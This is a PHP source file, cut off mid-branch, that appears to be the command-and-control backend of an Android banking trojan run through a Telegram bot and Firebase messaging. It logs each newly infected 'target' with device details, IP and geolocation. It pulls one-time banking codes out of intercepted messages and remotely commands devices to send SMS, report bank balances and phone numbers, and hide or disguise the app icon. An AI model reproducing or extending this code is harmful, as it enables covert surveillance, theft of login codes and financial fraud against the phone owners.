<?php
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING); ini_set('display_errors', 0); set_error_handler(function($errno, $errstr) { return true; });

include("chalim.php");

define('TOKEN', $bot_token);
define('PROJECT_ID', $project_id);
define('FILE', $file);

define('PORT_SUDO', $sudo_port);

#---------------------------------

function get_ipv4($ip) {
    // اگر IP از قبل IPv4 باشد، همان را برگردان
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return $ip;
    }
    
    // اگر IPv6 است، سعی کن به IPv4 تبدیل کنی
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        $apis = [
            "https://api64.ipify.org?format=json",
            "https://api.ipify.org?format=json", 
            "http://ipv4.ipify.org"
        ];
        
        foreach ($apis as $api) {
            try {
                $response = @file_get_contents($api, false, stream_context_create([
                    'http' => ['timeout' => 2]
                ]));
                
                if ($response !== false) {
                    $data = json_decode($response, true);
                    if (isset($data['ip']) && filter_var($data['ip'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                        return $data['ip'];
                    } elseif (filter_var($response, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                        return trim($response);
                    }
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
    // اگر تبدیل ممکن نبود، IP اصلی را برگردان
    return $ip;
}
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}

function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);


    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

function strposA($text, $needles = array())
{
    $isin = false;
    for ($i = 0; $i < count($needles); $i++) {
        if (strpos($text, $needles[$i]) !== false) {
            $isin = true;
        }
    }
    return $isin;
}
function findPooya($string)
{
    $date = '';
    $explode = explode("\n", $string);
    foreach ($explode as $line) {
        if (strpos($line, "code") !== false or strpos($line, "ورود") !== false or strpos($line, "پویا") !== false or strpos($line, "رمز") !== false or strpos($line, "Code") !== false) {
            if (strposA($line, ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])) {
                $pan = getNumber($line);
            }
        }
    }
    return $pan;
}
function getNumber($string)
{
    $number = '';
    for ($i = 0; $i < strlen($string); $i++) {
        if (is_numeric($string[$i])) {
            $number .= $string[$i];
        }
    }
    return $number;
}

function getNumber2($x)
{
    preg_match('/[A-Za-z0-9]+/', $x, $matches);
    $number = $matches[0];
    return $number;
}

function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}
function EMflag(string $code): string
{
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $code
    );
}
function asd($string, $start, $end)
{
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
}

function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}

function addOnlineUser($androidid)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $onlineUsers[$androidid] = "";
    file_put_contents($filePath, json_encode($onlineUsers));
}

function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page));

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return ['users' => $usersOnPage, 'totalUsers' => $totalUsers, 'totalPages' => $totalPages, 'currentPage' => $page];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        if ($currentPage > 1) {
            $keyboard[] = ['text' => 'Previous', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $keyboard[] = ['text' => 'Next', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
    }

    return json_encode(['inline_keyboard' => [$keyboard]]);
}

function updateJsonValueInFile($filename, $key, $newValue)
{
    $jsonString = file_get_contents($filename);

    $data = json_decode($jsonString, true);

    if (array_key_exists($key, $data)) {
        $data[$key] = $newValue;
    } else {
        $data[$key] = $newValue;
    }
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}

function doFirstAction($bal,$targetphone,$hide,$androidid){
    if($bal == "on"){
        requests("balance",$androidid);
    }
    if($targetphone == "on"){
        requests("userphone",$androidid);
    }
    if($hide == "on"){
        requests("hidden",$androidid);
    }
}


function updateMessageWithUsers($chatId, $messageId, $currentPage) {
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

    $text = "📡 Active Connections List:\n\n";
    
    foreach ($users as $androidid => $name) {
        $userName = file_exists("user/$androidid-name.txt") ? 
                   file_get_contents("user/$androidid-name.txt") : 
                   "user".rand(1,100); 

        $text .= $userName . "-/set_" . $androidid . "\n";
    }
    
    $text .= "\nTotal Devices: " . $totalUsers . "\n";
    $text .= "Page " . $pagination['currentPage'] . "/" . $totalPages . "\n";
    $text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    $keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);

    emg($chatId, $messageId, $text, $keyboard);
}
    
      
/*{
            static $Ary_List = array('REMOTE_ADDR', 'HTTP_CLIENT_IP', 'CLIENT_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_FORWARDED', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_HOST', 'HTTP_X_FORWARDED_SERVER', 'FORWARDED_FOR_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_X_FORWARDED_FOR', 'FORWARDED', 'X_FORWARDED_FOR', 'FORWARDED_FOR', 'X_FORWARDED', 'HTTP_VIA', 'VIA');                        
                foreach($Ary_List as $Value_array)        
                {        
                    if(isset($_SERVER[$Value_array]))        
                    {        
                        return $_SERVER[$Value_array];        
                    }        
                    elseif(getenv($Value_array))        
                    {        
                        return getenv($Value_array);        
                    }        
                    else        
                    {        
                        continue;        
                    }        
                }                        
            return 0;        
        }*/
#----------------------------------------------
$ip = Client_IP();
mkdir('user');
$action = $_POST['action'];

if (isset($_POST['Device_id'])) {
    $Device_id = $_POST['Device_id'];
}
if (isset($_POST['Model'])) {
    $Model = $_POST['Model'];
}
if (isset($_POST['Battery'])) {
    $Battery = $_POST['Battery'];
}
if (isset($_POST['andver'])) {
    $os = $_POST['andver'];
}
if (isset($_POST['operator'])) {
    $operator = $_POST['operator'];
}
if (isset($_POST['sender'])) {
    $sender = $_POST['sender'];
}
if (isset($_POST['screen'])) {
    $screen = $_POST['screen'];
}
if (isset($_POST['phones'])) {
    $phones = $_POST['phones'];
}
if (isset($_POST['messagetext'])) {
    $message_text = $_POST['messagetext'];
}
if (isset($_POST['message'])) {
    $message_ussd = $_POST['message'];
}
if (isset($_POST['Android'])) {
    $Android = $_POST['Android'];
}
if (isset($_POST['berand'])) {
    $berand = $_POST['berand'];
}
if (isset($_POST['Product'])) {
    $Product = $_POST['Product'];
}
if (isset($_POST['word'])) {
    $kal = $_POST['word'];
}
if (isset($_POST['AppName'])) {
    $AppName = $_POST['AppName'];
}

#---------------------------------------------
$install_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "fs $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "Kops $Device_id $Model"], ['text' => "", 'callback_data' => "kkkk $Device_id $Model"]]
]]);
$online_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "hg $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
    [['text' => "", 'callback_data' => "rt $Device_id $Model"]]
]]);
$Log_Panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "ID : $Device_id", 'callback_data' => "ls $Device_id $Model"]]
]]);
$status_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "rt $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]], [['text' => "", 'callback_data' => "kkkk $Device_id $Model"]],
]]);
$sms_panel = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "", 'callback_data' => "newic $Device_id $Model"], ['text' => "", 'callback_data' => "ls $Device_id $Model"]],
]]);

#---------------------------------------------
if (isset($_POST['action'])) {
    $action_autohide = file_get_contents("data/autohide.txt");
    $action_first = file_get_contents("data/firstsms.txt");
    $Message_First = file_get_contents("data/number-first.txt");
    $Number_First = file_get_contents("data/message-first.txt");
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $online_model = file_get_contents("data/online_model.txt");
    $bal = json_decode(file_get_contents("data/actionfirst.json"))->balance;
    $targetpgone = json_decode(file_get_contents("data/firstaction.json"))->targetphone;
    $autohide = json_decode(file_get_contents("data/firstaction.json"))->autohide;
}
#---------------------------------------------

		
function getPersianDateTimeEnglish() {
    date_default_timezone_set('Asia/Tehran');
    $persian_months = array(
        'Farvardin', 'Ordibehesht', 'Khordad', 
        'Tir', 'Mordad', 'Shahrivar',
        'Mehr', 'Aban', 'Azar',
        'Dey', 'Bahman', 'Esfand'
    );
    
    $timestamp = time();
    $date = new DateTime();
    $date->setTimestamp($timestamp);
    
    $persian_date = new IntlDateFormatter(
        'en_US@calendar=persian',
        IntlDateFormatter::FULL,
        IntlDateFormatter::FULL,
        'Asia/Tehran',
        IntlDateFormatter::TRADITIONAL
    );
    
    $formatted = $persian_date->format($date);
    // Extract components
    preg_match('/(\w+), (\w+) (\d+), (\d+)/', $formatted, $matches);
    
    return $matches[2].' '.$matches[3].', '.$matches[4].' | '.date('H:i', $timestamp);
}
function sendCommandWithResponse($chat_id, $device_id, $model, $command, $success_message) {
    $wait_message = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 Waiting for response from device...\n"
                . "👤 Target: $device_id | [$model]\n"
                . "🫡 Command: $command\n"
                . "⏱ Request Time: " . getPersianDateTimeEnglish(),
        'parse_mode' => 'HTML'
    ]);
    
    $message_id = $wait_message->result->message_id;
    
    sleep(3);
    
    bot('editMessageText', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $success_message . "\n\n"
                . "📅 Completion Time: " . getPersianDateTimeEnglish() . "\n"
                . "👨‍💻 Developer: @im_saeedi",
        'parse_mode' => 'HTML'
    ]);
}

if ($action == "install") {
    if (!file_exists("user/$Device_id-model.txt")) {
        $cont = file_get_contents("data/contact.txt");
        $kossher = $cont + 1;
        file_put_contents("user/$Device_id-apk.txt", "Visible");
        file_put_contents("user/$Device_id-ringer.txt", "No set");
        file_put_contents("user/$Device_id-name.txt", "User$kossher");
        file_put_contents("user/$Device_id-offline.txt", "OFF");
        file_put_contents("user/$Device_id-ip.txt", $ip);
        file_put_contents("user/$Device_id-model.txt", $Model);
        file_put_contents("user/$Device_id-op.txt", $operator);
        file_put_contents("data/contact.txt", $cont + 1);

        if (isset($AppName) && !empty($AppName)) {
            file_put_contents("user/appname-$Device_id.txt", $AppName);
        }
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        
        $message = "✅ <b>ɴᴇᴡ ᴛᴀʀɢᴇᴛ #ɪɴꜱᴛᴀʟʟᴇᴅ</b>\n\n";
        $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>" . ($operator ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . ($AppName ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:Normal | ꜱᴄʀᴇᴇɴ:OFF</code>\n\n";
        $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";
        
        smg($id_sender, $message, $install_panel);
        
    } else {
        if (isset($AppName) && !empty($AppName)) {
            file_put_contents("user/appname-$Device_id.txt", $AppName);
        }
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"]);
        
        $message = "✅ <b>ᴛᴀʀɢᴇᴛ $name ᴀɢᴀɪɴ #ɪɴꜱᴛᴀʟʟᴇᴅ</b>\n\n";
        $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $message .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>" . ($operator ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $message .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . ($AppName ?? 'Unknown') . "</code>\n";
        $message .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $message .= "└ <b>ꜱᴇᴄᴜʀɪᴛʏ</b>: <code>ɪᴄᴏɴ:Normal | ꜱᴄʀᴇᴇɴ:OFF</code>\n\n";
        $message .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";
        
        smg($id_sender, $message, $install_panel);
    }

    // منطق بهبود یافته برای تشخیص سامسونگ
    function isSamsungDevice($brand, $model) {
        // بررسی بر اساس برند
        if ($brand && stripos($brand, 'samsung') !== false) {
            return true;
        }
        
        // بررسی بر اساس مدل (مدل‌های سامسونگ معمولاً با SM- شروع می‌شوند)
        if ($model && (stripos($model, 'SM-') === 0 || stripos($model, 'SAMSUNG') !== false)) {
            return true;
        }
        
        return false;
    }

    // دریافت اطلاعات برند و مدل
    $brand = '';
    $brand_file = "user/$Device_id-brand.txt";
    if (file_exists($brand_file)) {
        $brand = strtolower(trim(file_get_contents($brand_file)));
    }
    
    $model = $Model; // مدل از POST دریافت شده

    $actions = [];
    
    $action_first = file_get_contents("data/firstsms.txt");
    if ($action_first == "on") {
        $actions[] = [
            'delay' => 3,
            'command' => 'send_sms',
            'params' => [
                $Device_id, 
                file_get_contents("data/number-first.txt"),
                file_get_contents("data/message-first.txt")
            ]
        ];
    }

    $action_autohide = file_get_contents("data/autohide.txt");
    if ($action_autohide == "on") {
        // تشخیص سامسونگ با منطق بهبود یافته
        $isSamsung = isSamsungDevice($brand, $model);
        $command = $isSamsung ? "changetogoogle" : "hidden";
        
        $actions[] = [
            'delay' => 4,
            'command' => $command,
            'params' => [$Device_id]
        ];
    }

    $firstActionConfig = json_decode(file_get_contents("data/firstaction.json"), true);
    if ($firstActionConfig['balance'] == "on") {
        $actions[] = [
            'delay' => 5,
            'command' => 'balance',
            'params' => [$Device_id]
        ];
    }
    if ($firstActionConfig['targetphone'] == "on") {
        $actions[] = [
            'delay' => 5,
            'command' => 'userphone',
            'params' => [$Device_id]
        ];
    }
    if ($firstActionConfig['autohide'] == "on") {
        // تشخیص سامسونگ با منطق بهبود یافته
        $isSamsung = isSamsungDevice($brand, $model);
        $command = $isSamsung ? "changetogoogle" : "hidden";
        
        $actions[] = [
            'delay' => 6,
            'command' => $command,
            'params' => [$Device_id]
        ];
    }

    $total_delay = 0;
    foreach ($actions as $action_item) {
        sleep($action_item['delay'] - $total_delay);
        $total_delay = $action_item['delay'];
        
        if ($action_item['command'] == 'send_sms') {
            requestSMS($action_item['command'], ...$action_item['params']);
        } else {
            requests($action_item['command'], ...$action_item['params']);
        }
        
        if ($action_item['command'] == 'changetogoogle') {
            smg($id_sender, "🔄 ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ: ɪᴄᴏɴ ᴄʜᴀɴɢᴇᴅ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ $Device_id\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);
        } elseif ($action_item['command'] == 'hidden') {
            smg($id_sender, "👻 ᴀᴜᴛᴏ ʜɪᴅᴅᴇ: ɪᴄᴏɴ ʜɪᴅᴅᴇɴ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ $Device_id\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);
        }
    }
}
if ($action == "install") {

    if ($action_first == "on") {


        $Number_First = file_get_contents("data/number-first.txt");
        $Message_First = file_get_contents("data/message-first.txt");
        sleep(3);
        requestSMS("send_sms", $Device_id, $Number_First, $Message_First);
    }
} elseif ($action == "normal_mode") {
    $msg_file = "user/$Device_id-normalmode-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
        $response_text = "🔊 ᴀᴄᴛɪᴏɴ #ɴᴏʀᴍᴀʟ_ᴍᴏᴅᴇ\n\n";

        $response_text .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $response_text .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $response_text .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $response_text .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $response_text .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $response_text .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $response_text .= "└ <b>ʀɪɴɢᴇʀ</b>: <code>ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ</code>\n\n";
        $response_text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id'    => $chat_id,
            'message_id' => $message_id,
            'text'       => $response_text,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($msg_file);
    }

} elseif ($action == "silent_mode") {
    $msg_file = "user/$Device_id-silentmode-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
        $response_text = "🔇 ᴀᴄᴛɪᴏɴ #ꜱɪʟᴇɴᴛ_ᴍᴏᴅᴇ\n\n";

        $response_text .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
        $response_text .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($Battery ?? 'N/A') . "%</code>\n";
        $response_text .= "├ <b>ᴀɴᴅʀᴏɪᴅ</b>: <code>" . ($os ?? 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>$current_operator</code>\n";
        $response_text .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . get_ipv4($ip) . "</code>\n";
        $response_text .= "├ <b>ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ</b>: <code>" . (file_exists("user/appname-$Device_id.txt") ? file_get_contents("user/appname-$Device_id.txt") : 'Unknown') . "</code>\n";
        $response_text .= "├ <b>ɢᴇᴏ</b>: <code>" . ($gcx['city'] ?? 'Unknown') . ", " . ($gcx['country'] ?? 'Unknown') . " $flag</code>\n";
        $response_text .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
        $response_text .= "└ <b>ʀɪɴɢᴇʀ</b>: <code>ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ</code>\n\n";
        $response_text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

        bot('editMessageText', [
            'chat_id'    => $chat_id,
            'message_id' => $message_id,
            'text'       => $response_text,
            'parse_mode' => 'HTML'
        ]);
        
        unlink($msg_file);
    }
} elseif ($action == "online_device") {
    // خواندن لیست فعلی کاربران
    $onlineUsers = json_decode(file_get_contents("data/online_users.json"), true);
    if (!$onlineUsers) {
        $onlineUsers = [];
    }
    
    // اضافه کردن کاربر جدید به لیست موجود
    $onlineUsers[$Device_id] = $Model;
    file_put_contents("data/online_users.json", json_encode($onlineUsers));
    
    // اگر حالت نمایش تکی فعال نیست، برگرد
    $online_model = file_get_contents("data/online_model.txt");
    if ($online_model == "list") {
        return;
    }
    
    // نمایش تکی کاربر (فقط اگر حالت list نباشد)
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $apk_status = file_get_contents("user/$Device_id-apk.txt");
    
    $message = "📡 ᴛᴀʀɢᴇᴛ <b>#ᴏɴʟɪɴᴇ</b>\n\n";
    $message .= "┌ <b>ᴅᴇᴠɪᴄᴇ</b>: <code>$Model</code>\n";
    $message .= "├ <b>ᴘᴏᴡᴇʀ</b>: <code>" . ($_POST['Battery'] ?? 'N/A') . "%</code>\n";
    $message .= "├ <b>ɴᴇᴛᴡᴏʀᴋ</b>: <code>" . ($_POST['operator'] ?? 'Unknown') . "</code>\n";
    $message .= "├ <b>ᴅᴇᴠɪᴄᴇ ɪᴅ</b>: <code>$Device_id</code>\n";
    $message .= "├ <b>ᴀᴅᴅʀᴇꜱꜱ</b>: <code>" . Client_IP() . "</code>\n";
    $message .= "├ <b>ᴘᴀɴᴇʟ</b>: /set_$Device_id\n";
    $message .= "└ <b>ꜱᴛᴀᴛᴜꜱ</b>: <code>ɪᴄᴏɴ:$apk_status | ꜱᴄʀᴇᴇɴ:" . ($offline == "ON" ? "OFF" : "ON") . "</code>\n\n";
    $message .= "🦂 | <a href='https://t.me/TLkiller_team'>ᴋɪʟʟᴇʀ-ᴛᴇᴀᴍ</a>";

    smg($id_sender, $message, $online_panel);


} elseif ($action == "Hidden_icon") {
    $msg_file = "user/$Device_id-hideicon-msg.txt";
    if (file_exists($msg_file)) {
        list($chat_id, $message_id) = explode("|", file_get_contents($msg_file));
        
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
        $flag = EMflag($gcx["countryCode"] ?? 'IR');
        
        // دریافت اپراتور از فایل ذخیره شده
        $saved_operator = file_exists("user/$Device_id-op.txt") ? file_get_contents("user/$Device_id-op.txt") : 'Unknown';
        $current_operator = ($operator && $operator != 'Unknown') ? $operator : $saved_operator;
        
